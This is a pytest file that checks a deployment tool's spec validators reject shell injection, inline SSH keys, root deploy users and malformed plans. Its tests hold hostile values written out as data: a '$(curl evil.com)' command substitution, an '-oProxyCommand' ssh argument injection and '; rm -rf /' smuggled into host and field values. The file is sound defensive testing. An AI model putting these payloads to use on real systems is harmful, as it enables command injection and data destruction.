"""Spec validation and plan value semantics."""

from __future__ import annotations

import pytest

from omniagentos.deploy.contracts import (
    AppSpec,
    DeployPlan,
    DeploySpecError,
    DeployStep,
    RunResult,
    ServerSpec,
)


def test_server_spec_rejects_shell_metacharacters() -> None:
    with pytest.raises(DeploySpecError):
        ServerSpec(host="1.2.3.4; rm -rf /", ssh_user="root", ssh_key_ref="ref")


def test_server_spec_rejects_inline_key_material() -> None:
    with pytest.raises(DeploySpecError):
        ServerSpec(
            host="1.2.3.4",
            ssh_user="root",
            ssh_key_ref="-----BEGIN OPENSSH PRIVATE KEY-----",
        )


def test_server_spec_rejects_unknown_runtime() -> None:
    with pytest.raises(DeploySpecError):
        ServerSpec(host="h", ssh_user="root", ssh_key_ref="r", runtime="ruby")  # type: ignore[arg-type]


def test_server_spec_refuses_root_as_deploy_user() -> None:
    with pytest.raises(DeploySpecError):
        ServerSpec(host="h", ssh_user="root", ssh_key_ref="r", deploy_user="root")


def test_app_spec_derived_paths(app: AppSpec) -> None:
    assert app.app_dir == "/srv/apps/demo-app"
    assert app.unit_name == "demo-app.service"
    assert app.unit_path == "/etc/systemd/system/demo-app.service"
    assert app.site_path == "/etc/caddy/sites/demo.example.com.caddy"


def test_plan_rejects_duplicate_step_ids() -> None:
    with pytest.raises(DeploySpecError):
        DeployPlan(
            name="p",
            target_host="h",
            steps=(DeployStep("a", "x", "true"), DeployStep("a", "y", "true")),
        )


def test_plan_lookup_and_script_rendering() -> None:
    plan = DeployPlan(
        name="p", target_host="h", steps=(DeployStep("a", "does a", "true"),)
    )
    assert len(plan) == 1
    assert plan.step("a").description == "does a"
    with pytest.raises(KeyError):
        plan.step("nope")
    script = plan.to_script()
    assert "# [a] does a" in script
    assert script.endswith("true\n")


def test_specs_are_frozen(app: AppSpec) -> None:
    with pytest.raises((AttributeError, TypeError, ValueError)):
        app.listen_port = 9000  # type: ignore[misc]


def test_run_result_ok() -> None:
    assert RunResult(0).ok
    assert not RunResult(1, stderr="nope").ok


# --- FINDING-3: opaque references must carry the same guards -----------------

_SHELL_META_PAYLOAD = "--format=evil $(curl evil.com)"
_LEADING_DASH_PAYLOAD = "-oProxyCommand=evil"


def _server(**over: object) -> None:
    base: dict[str, object] = {"host": "1.2.3.4", "ssh_user": "deploy", "ssh_key_ref": "vault://k"}
    base.update(over)
    ServerSpec(**base)  # type: ignore[arg-type]


def _app(**over: object) -> None:
    base: dict[str, object] = {
        "repo_url_or_local_path": "https://github.com/a/b.git",
        "domain": "example.com",
        "service_name": "app",
        "listen_port": 8080,
        "build_cmd": "make",
        "start_cmd": "run",
    }
    base.update(over)
    AppSpec(**base)  # type: ignore[arg-type]


@pytest.mark.parametrize("payload", [_SHELL_META_PAYLOAD, _LEADING_DASH_PAYLOAD])
def test_env_ref_rejects_injection(payload: str) -> None:
    with pytest.raises(DeploySpecError):
        _app(env_ref=payload)


def test_env_ref_empty_is_allowed() -> None:
    _app(env_ref="")  # optional; absence of secrets is legitimate


@pytest.mark.parametrize("payload", [_SHELL_META_PAYLOAD, _LEADING_DASH_PAYLOAD])
def test_ssh_key_ref_rejects_injection(payload: str) -> None:
    with pytest.raises(DeploySpecError):
        _server(ssh_key_ref=payload)


# Complete enumeration: EVERY spec field that can flow into a shell command or an
# ssh/rsync/git argument must reject a shell-meta payload AND a leading-dash
# payload. `factory` builds the spec with that one field overridden.
#
# Fields deliberately NOT in this table, with the reason they are safe:
#   ServerSpec.runtime      -- Literal enum, validated against {'python','node'}
#   ServerSpec.packages     -- each atom must match _PACKAGE_RE (^[a-z0-9], no meta/dash)
#   ServerSpec.deploy_user  -- _USER_RE (^[a-z_], no meta/dash) + root check
#   AppSpec.domain          -- _DOMAIN_RE (^[a-z0-9], no meta/dash)
#   AppSpec.service_name    -- _SERVICE_RE (^[a-z0-9], no meta/dash)
#   AppSpec.deploy_user     -- _USER_RE, as above
#   AppSpec.listen_port     -- int, range-checked (not a string)
#   AppSpec.build_cmd/start_cmd -- ARE commands by design; guarded against the
#                                  break-out chars (newline, single quote) only
_INJECTABLE_FIELDS = [
    ("ServerSpec.host", lambda p: _server(host=p)),
    ("ServerSpec.ssh_user", lambda p: _server(ssh_user=p)),
    ("ServerSpec.ssh_key_ref", lambda p: _server(ssh_key_ref=p)),
    ("AppSpec.repo_url_or_local_path", lambda p: _app(repo_url_or_local_path=p)),
    ("AppSpec.env_ref", lambda p: _app(env_ref=p)),
]


@pytest.mark.parametrize("payload", [_SHELL_META_PAYLOAD, _LEADING_DASH_PAYLOAD, "; rm -rf /", "-x"])
@pytest.mark.parametrize("name,factory", _INJECTABLE_FIELDS, ids=[f[0] for f in _INJECTABLE_FIELDS])
def test_every_command_flowing_field_rejects_injection(
    name: str, factory, payload: str
) -> None:
    with pytest.raises(DeploySpecError):
        factory(payload)
